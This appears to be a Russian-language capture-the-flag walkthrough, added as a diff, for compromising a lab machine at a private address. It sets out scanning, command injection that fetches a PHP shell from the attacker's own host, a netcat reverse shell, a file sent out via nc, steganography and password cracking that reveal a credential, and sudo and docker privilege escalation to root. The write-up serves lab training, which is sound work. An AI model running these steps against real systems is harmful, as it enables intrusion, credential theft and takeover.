@@ -1,0 +1,42 @@
+1)nmap -A  -sS -T4 192.168.226.192 -p-
+    ничего интересного:ssh,ftp,http
+
+2)ftp 192.168.226.192
+    note.txt    
+        ничего важного
+
+3)gobuster -e -u dir http://192.168.226.192 -w /root/Downloads/common.txt -x zip,php,txt,html,bac,mp4,docx,doc,sh,bak
+    secret
+        инересная страница, с которой можно выполнять команды
+
+4)id; wget -P /tmp 192.168.226.135:8000/shell.php       //вводим в окошко на странице /secret
+    преварительно включив сервак у себя
+        python3 -m http.server
+
+5)id; php /tmp/shell.php                //вводим в окошко на странице /secret
+    предварительно у себя
+        rlwrap nc -nlvp 1234
+
+6)sudo -l
+    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
+
+        sudo -u apaar /home/apaar/.helpline.sh
+            и вводим bash чтобы проэксплуатировать и повысить привиллегии
+            вуаля мы apaar
+
+7)в /var/www/files/images мы обнаруживаем картинку в которой может быть скрыта подсказка к паролю др пользователя
+    <your-own-comp>$ nc -lnvp 8000 > hacker.jpg
+    <victim-comp>$ nc -w 3 192.168.226.135 8000 < hacker-with-laptop_23-2147985341.jpg
+
+    steghide extract -sf hacker.jpg
+        backup.zip
+        с паролем естественно
+            zip2john backup.zip  > hash
+            john --wordlist=/root/Downloads/rockyou.txt hash 
+                вот мы и нашли пароль anurodh:!d0ntKn0wmYp@ssw0rd
+
+8)id
+.....(docker)
+    вот и зацепочка , кадо воспользоваться docker для повышения привиллегий
+        docker run -v /etc/:/mnt -it alpine
+        ВУАЛЯ вот мы и рут
